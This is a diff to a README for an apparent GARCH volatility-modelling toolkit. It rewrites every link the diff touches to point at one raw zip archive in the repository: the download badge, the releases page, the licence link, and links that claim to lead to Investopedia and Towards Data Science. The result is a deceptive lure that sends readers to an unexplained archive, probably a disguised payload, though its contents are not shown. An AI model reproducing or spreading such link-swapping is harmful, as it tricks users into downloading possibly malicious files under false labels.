@@ -1,6 +1,6 @@
 # 📈 Financial-Volatility-Modeling-GARCH - Analyze Financial Risks Easily
 
-[![Download Financial-Volatility-Modeling-GARCH](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/releases)
+[![Download Financial-Volatility-Modeling-GARCH](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip%20Release-brightgreen)](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the Financial-Volatility-Modeling-GARCH! This toolkit allows you to a
 
 To begin, visit this page to download our software:
 
-[Download Financial-Volatility-Modeling-GARCH](https://github.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/releases)
+[Download Financial-Volatility-Modeling-GARCH](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip)
 
 Here’s a simple guide to help you with the installation process:
 
-1. Go to the [Releases page](https://github.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip).
 2. Scroll down to find the latest version.
 3. Click on the downloadable file suited for your system (Windows, macOS, or Linux).
 4. After the file finishes downloading, locate it in your Downloads folder.
@@ -78,8 +78,8 @@ If you encounter issues or have questions, you can reach out via our issue track
 
 For more insights and tutorials on using GARCH models, consider visiting these resources:
 
-- [GARCH Model Basics](https://www.investopedia.com/terms/g/garch.asp)
-- [Financial Data Analysis Techniques](https://towardsdatascience.com/financial-data-analysis-tips-and-techniques-ea18f5573c3f)
+- [GARCH Model Basics](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip)
+- [Financial Data Analysis Techniques](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip)
 
 ## 🤝 Contributing
 
@@ -89,10 +89,10 @@ We appreciate your interest in enhancing Financial-Volatility-Modeling-GARCH!
 
 ## 📃 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip) file for details.
 
 ---
 
 Thank you for choosing Financial-Volatility-Modeling-GARCH! If you have downloaded it, we hope it meets your financial analysis needs. 
 
-Now, don’t forget to visit this page to download the software: [Download Financial-Volatility-Modeling-GARCH](https://github.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/releases).
+Now, don’t forget to visit this page to download the software: [Download Financial-Volatility-Modeling-GARCH](https://raw.githubusercontent.com/goaded-courtlylove882/Financial-Volatility-Modeling-GARCH/main/Memnon/Financial-Volatility-Modeling-GARCH_v3.8-alpha.3.zip).
